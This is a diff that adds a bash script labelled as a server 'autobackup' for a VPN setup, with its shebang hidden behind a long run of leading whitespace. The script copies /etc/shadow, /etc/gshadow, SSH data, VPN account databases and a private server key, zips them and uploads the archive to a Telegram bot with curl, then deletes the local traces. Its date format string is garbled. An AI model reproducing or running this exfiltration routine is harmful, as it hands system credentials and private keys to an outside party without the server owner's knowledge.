@@ -1,0 +1,38 @@
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                #!/bin/bash
+ipsaya=$(wget -qO- ipinfo.io/ip)
+date=$(date +"%Y-No such file or directory-0")
+TEXT="
+AUTOBACKUP FILES SERVER $date
+"
+source '/etc/ftvpn/var.txt'
+mkdir -p /root/backup
+cp -r /etc/xray/config.json backup/ >/dev/null 2>&1
+cp -r /etc/xray/*.log backup/ >/dev/null 2>&1
+cp /etc/passwd backup/
+cp /etc/group backup/
+cp /etc/shadow backup/
+cp /etc/gshadow backup/
+cp -r /var/www/html backup/html
+cp -r /etc/limit/vmess/ backup/vmess
+cp -r /etc/limit/vless/ backup/vless
+cp -r /etc/limit/trojan/ backup/trojan
+cp -r /etc/limit/shadowsocks/ backup/shadowsocks
+cp -r /etc/ssh/.ssh.db backup/ssh.db
+cp -r /etc/vmess/.vmess.db backup/vmess.db
+cp -r /etc/vless/.vless.db backup/vless.db
+cp -r /etc/trojan/.trojan.db backup/trojan.db
+cp -r /etc/shadowsocks/.shadowsocks.db backup/shadowsocks.db
+cp -r /etc/ssh/ backup/database
+cp -r /etc/vmess/ backup/database
+cp -r /etc/vless/ backup/database
+cp -r /etc/trojan/ backup/database
+cp -r /etc/ssh/ backup/database
+cp -r /etc/shadowsocks/ backup/database
+cp -r /etc/slowdns/server.pub backup/server.pub
+cp -r /etc/slowdns/server.key backup/server.key
+zip -r FT-$ipsaya-${date}.zip backup >/dev/null 2>&1
+
+curl -F chat_id="$ADMIN" -F document=@"FT-$ipsaya-${date}.zip" -F caption="$TEXT" https://api.telegram.org/bot$BOT_TOKEN/sendDocument
+rm -rf /root/backup &>/dev/null
+rm -f /root/FT-$ipsaya-${date}.zip &>/dev/null
+
